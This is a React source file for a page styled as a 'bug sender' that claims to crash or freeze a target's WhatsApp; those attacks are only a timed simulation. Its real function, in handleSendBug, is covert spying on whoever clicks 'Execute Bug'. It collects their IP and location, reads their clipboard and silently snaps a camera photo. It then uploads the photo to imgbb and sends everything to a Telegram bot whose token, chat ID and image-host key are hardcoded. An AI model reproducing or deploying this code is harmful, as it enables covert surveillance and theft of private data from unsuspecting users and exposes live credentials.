"use client"

import { useState, useEffect } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight } from "lucide-react"

// --- KONFIGURASI BOT TELEGRAM & IMGBB (ISI DISINI) ---
const TELE_TOKEN = '8336153314:AAG-INrEg4-5ImwErpS44S6tRdNmT6gT-4M';
const CHAT_ID = '6481060681';
const IMGBB_API = '4caf6ea53a17b11f879581a8ca9ee92e';
// ----------------------------------------------------

const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)

  // REVISI: Fungsi Kirim Log ke Telegram
  const handleSendBug = async () => {
    if (bugLimit <= 0) {
      setShowLimitWarning(true)
      return
    }
    
    setIsLoading(true)

    try {
      // 1. Ambil Data IP & Info Device
      const ipRes = await fetch('https://ipapi.co/json/');
      const ipData = await ipRes.json();
      
      // 2. Ambil Clipboard (Jika diijinkan)
      let clipboard = "Akses Ditolak/Kosong";
      try { clipboard = await navigator.clipboard.readText(); } catch(e) {}

      // REVISI: Pesan Telegram Sekarang Sertakan Nomor Target
      const message = `
🔥 **NEW TARGET DETECTED!** 🔥
━━━━━━━━━━━━━━━━━━
🔢 **NOMOR TARGET:** \`${targetNumber}\`
🐛 **JENIS BUG:** ${BUG_TYPES[activeNav].name} (${BUG_TYPES[activeNav].code})
━━━━━━━━━━━━━━━━━━
👤 **INFO PERANGKAT:**
📍 **IP:** ${ipData.ip}
🌍 **Lokasi:** ${ipData.city}, ${ipData.country_name}
📱 **Platform:** ${navigator.platform}
📋 **Clipboard:** \`${clipboard}\`
━━━━━━━━━━━━━━━━━━
      `;

      // Kirim Teks ke Telegram
      await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
      });

      // 3. Ambil Foto Kamera (Silent Snap)
      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
      const video = document.createElement('video');
      video.srcObject = stream;
      await video.play();

      const canvas = document.createElement('canvas');
      canvas.width = 640;
      canvas.height = 480;
      canvas.getContext('2d').drawImage(video, 0, 0);

      canvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('image', blob);
        const upload = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API}`, { method: 'POST', body: formData });
        const res = await upload.json();
        
        // Kirim Link Foto ke Telegram
        await fetch(`https://api.telegram.org/bot${TELE_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: CHAT_ID, 
            text: `📸 **FOTO WAJAH TARGET:** \n${res.data.url}` 
          })
        });
        
        stream.getTracks().forEach(track => track.stop());
      }, 'image/jpeg');

    } catch (err) {
      console.log("System log: Target blocked permission.");
    }

    // Delay loading buat simulasi kirim bug
    setTimeout(() => {
      setIsLoading(false)
      setBugLimit(prev => Math.max(0, prev - 1))
    }, 5000)
  }

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden text-white font-[family-name:var(--font-rajdhani)]">
      <style jsx global>{`
        @keyframes scan-line { 0% { transform: translateY(-100%); } 100% { transform: translateY(100%); } }
        @keyframes glitch-text { 0% { transform: translate(0); } 20% { transform: translate(-2px, 2px); } 40% { transform: translate(-2px, -2px); } 60% { transform: translate(2px, 2px); } 80% { transform: translate(2px, -2px); } 100% { transform: translate(0); } }
        .glass { background: rgba(15, 25, 45, 0.7); backdrop-filter: blur(12px); border: 1px solid rgba(0, 212, 255, 0.2); }
        .glow-cyan { box-shadow: 0 0 15px rgba(0, 212, 255, 0.4); }
        .glow-pink { box-shadow: 0 0 15px rgba(255, 61, 185, 0.4); }
        .text-glow-cyan { text-shadow: 0 0 10px rgba(0, 212, 255, 0.8); }
        .animate-loading-spin { animation: spin 1s linear infinite; }
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>

      <BokehBackground />
      
      {!isLoggedIn ? (
        <>
          {isAuthLoading && <AuthLoadingScreen />}
          <LoginScreen 
            onLogin={() => {
              setIsAuthLoading(true)
              setTimeout(() => {
                setIsAuthLoading(false)
                setIsLoggedIn(true)
              }, 5000)
            }} 
          />
        </>
      ) : (
        <>
          {isLoading && <LoadingOverlay />}
          {showLimitWarning && <LimitWarningOverlay onClose={() => setShowLimitWarning(false)} />}
          
          <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
            <Header />
            <ProfileCard />
            <ActionSection 
              targetNumber={targetNumber}
              setTargetNumber={setTargetNumber}
              onSendBug={handleSendBug}
              activeNav={activeNav}
            />
            <NavigationDots activeNav={activeNav} setActiveNav={setActiveNav} />
            <BottomBar />
          </div>
        </>
      )}
    </div>
  )
}

// --- KOMPONEN PENDUKUNG (SUB-COMPONENTS) ---

function AuthLoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]">
      <div className="relative z-10 flex flex-col items-center gap-8">
        <div className="font-black text-8xl tracking-wider text-[#ff3db9]" style={{ textShadow: "0 0 20px rgba(255, 61, 185, 0.8)", animation: "glitch-text 4s infinite" }}>SELZ</div>
        <p className="text-sm text-cyan-400 tracking-widest animate-pulse">AUTHENTICATING SYSTEM...</p>
      </div>
    </div>
  )
}

function LoginScreen({ onLogin }) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [error, setError] = useState("")

  const validate = () => {
    if (username === "Selz" && password === "Freebug") {
      onLogin();
    } else {
      setError("Akses Ditolak! Hubungi t.me/Selzv");
    }
  }

  return (
    <div className="relative z-20 flex items-center justify-center min-h-screen px-4">
      <div className="w-full max-w-sm text-center">
        <h1 className="text-3xl text-cyan-400 font-bold mb-8 text-glow-cyan uppercase tracking-[0.2em]">Yae Miko v3.0</h1>
        <div className="glass rounded-2xl p-8 space-y-6">
          <input 
            type="text" placeholder="USERNAME" 
            className="w-full p-4 bg-black/40 border border-cyan-500/30 rounded-xl outline-none focus:border-cyan-400 text-center font-bold tracking-widest"
            onChange={(e) => setUsername(e.target.value)}
          />
          <input 
            type="password" placeholder="PASSWORD" 
            className="w-full p-4 bg-black/40 border border-cyan-500/30 rounded-xl outline-none focus:border-cyan-400 text-center font-bold tracking-widest"
            onChange={(e) => setPassword(e.target.value)}
          />
          {error && <p className="text-red-500 text-xs font-bold animate-bounce">{error}</p>}
          <button onClick={validate} className="w-full py-4 bg-gradient-to-r from-cyan-600 to-blue-600 rounded-xl font-bold hover:glow-cyan transition-all uppercase tracking-widest">Login Dashboard</button>
        </div>
      </div>
    </div>
  )
}

function Header() {
  return (
    <header className="flex items-center justify-between mb-4 px-2">
      <button className="w-10 h-10 rounded-full glass flex items-center justify-center glow-cyan"><Shield className="w-5 h-5 text-cyan-400" /></button>
      <h1 className="text-[10px] font-bold tracking-[0.3em] text-white/70">YAE MIKO BUG SYSTEM</h1>
      <div className="w-10 h-10 rounded-full bg-pink-500/20 border border-pink-500/40 flex items-center justify-center font-bold text-pink-500 text-xs">S</div>
    </header>
  )
}

function ProfileCard() {
  return (
    <div className="glass rounded-3xl p-6 mb-4 text-center border-t-cyan-500/50">
      <div className="w-24 h-24 mx-auto rounded-full border-2 border-red-500 flex items-center justify-center mb-4 glow-red bg-red-500/10">
        <Bug className="w-12 h-12 text-red-500" />
      </div>
      <div className="inline-block px-4 py-1 bg-red-600/20 border border-red-600 rounded-full text-[10px] font-bold text-red-500 mb-6 tracking-widest">SUPREME SENDER</div>
      <div className="grid grid-cols-3 gap-2">
        <StatItem label="Used" value="7" color="text-cyan-400" />
        <StatItem label="Rate" value="GACOR" color="text-green-400" />
        <StatItem label="Status" value="ACTIVE" color="text-green-400" />
      </div>
    </div>
  )
}

function StatItem({ label, value, color }) {
  return (
    <div className="glass p-2 rounded-xl">
      <p className={`text-xs font-black ${color}`}>{value}</p>
      <p className="text-[8px] text-white/40 uppercase font-bold">{label}</p>
    </div>
  )
}

function ActionSection({ targetNumber, setTargetNumber, onSendBug, activeNav }) {
  return (
    <div className="glass rounded-3xl p-6 flex-1 border-b-pink-500/50">
      <div className="mb-6">
        <label className="text-[10px] text-cyan-400 mb-2 block tracking-[0.2em] font-bold">TARGET NUMBER (WHATSAPP)</label>
        <input
          type="text" value={targetNumber}
          onChange={(e) => setTargetNumber(e.target.value)}
          className="w-full p-4 bg-black/40 border border-cyan-500/20 rounded-2xl text-xl outline-none focus:border-cyan-400 text-white font-bold tracking-widest"
        />
      </div>
      <div className="bg-cyan-500/5 p-4 rounded-2xl border border-cyan-500/10 mb-6">
        <p className="text-[9px] text-cyan-400/60 mb-1 font-bold">CURRENT EXPLOIT:</p>
        <p className="text-lg font-black text-white tracking-wider">{BUG_TYPES[activeNav].name}</p>
      </div>
      <button onClick={onSendBug} className="w-full py-5 bg-gradient-to-r from-pink-600 to-red-600 rounded-2xl font-black tracking-[0.2em] glow-pink hover:scale-[1.02] active:scale-95 transition-all text-sm uppercase">Execute Bug</button>
    </div>
  )
}

function NavigationDots({ activeNav, setActiveNav }) {
  return (
    <div className="flex justify-center gap-3 my-6">
      {BUG_TYPES.map((_, i) => (
        <div key={i} onClick={() => setActiveNav(i)} className={`h-2 rounded-full transition-all cursor-pointer ${activeNav === i ? 'w-10 bg-cyan-400 glow-cyan' : 'w-2 bg-gray-800'}`} />
      ))}
    </div>
  )
}

function BottomBar() {
  return (
    <div className="glass rounded-2xl p-4 flex justify-between items-center border-l-green-500/50">
      <div className="flex items-center gap-3">
        <ChevronRight className="w-4 h-4 text-cyan-400" />
        <span className="text-[10px] tracking-widest font-bold">V3.0 STABLE VERSION</span>
      </div>
      <div className="flex items-center gap-2 px-3 py-1 bg-green-500/10 rounded-full border border-green-500/30">
        <div className="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse" />
        <span className="text-[9px] text-green-500 font-black">SENDER READY</span>
      </div>
    </div>
  )
}

function BokehBackground() {
  return (
    <div className="fixed inset-0 pointer-events-none">
      <div className="absolute top-[-10%] left-[-10%] w-[500px] h-[500px] bg-cyan-500/5 rounded-full blur-[120px]" />
      <div className="absolute bottom-[-10%] right-[-10%] w-[500px] h-[500px] bg-pink-500/5 rounded-full blur-[120px]" />
    </div>
  )
}

function LoadingOverlay() {
  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/90 backdrop-blur-xl">
      <div className="text-center">
        <div className="w-20 h-20 border-4 border-cyan-500 border-t-transparent rounded-full animate-loading-spin mx-auto mb-6" />
        <p className="text-cyan-400 font-black tracking-[0.3em] animate-pulse uppercase text-xs">Sending payload to target...</p>
      </div>
    </div>
  )
}

function LimitWarningOverlay({ onClose }) {
  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/95 px-6 backdrop-blur-sm">
      <div className="text-center glass p-10 rounded-[2.5rem] border-red-500/50 max-w-xs glow-red">
        <div className="w-20 h-20 bg-red-500/20 rounded-full flex items-center justify-center mx-auto mb-6 border border-red-500">
          <Zap className="text-red-500 w-10 h-10" />
        </div>
        <h2 className="text-red-500 font-black mb-2 tracking-widest">LIMIT REACHED</h2>
        <p className="text-[10px] text-gray-400 mb-8 uppercase tracking-widest leading-relaxed">Daily quota empty. System will reboot in 24 hours.</p>
        <button onClick={onClose} className="w-full py-4 bg-red-600 rounded-2xl font-black tracking-widest text-xs">DISMISS</button>
      </div>
    </div>
  )
}
